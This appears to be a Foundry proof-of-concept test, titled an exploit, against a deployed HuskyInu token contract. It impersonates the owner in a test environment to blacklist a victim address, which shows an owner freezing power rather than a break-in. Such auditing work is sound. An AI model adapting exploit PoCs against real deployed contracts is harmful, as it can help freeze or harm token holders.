// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IHuskyInu {
    function owner() external view returns (address);
    function addBlacklist(address b, bool enable) external;
    function blacklist(address) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x40a5Ad300Ee5a5b8bA6B50719647C19F2E52d5BE;
    address attacker = address(this);
    IHuskyInu husky;
    address owner;
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        husky = IHuskyInu(TARGET);
        owner = husky.owner();
        victim = address(0x1337);
        vm.label(owner, "Owner");
        vm.label(victim, "Victim");
        vm.label(TARGET, "HuskyInu Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        vm.startPrank(owner);
        husky.addBlacklist(victim, true);
        vm.stopPrank();

        // Verify the blacklist is set
        bool isBlacklisted = husky.blacklist(victim);
        assertEq(isBlacklisted, true, "Victim should be blacklisted");
        assertEq(husky.blacklist(victim), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

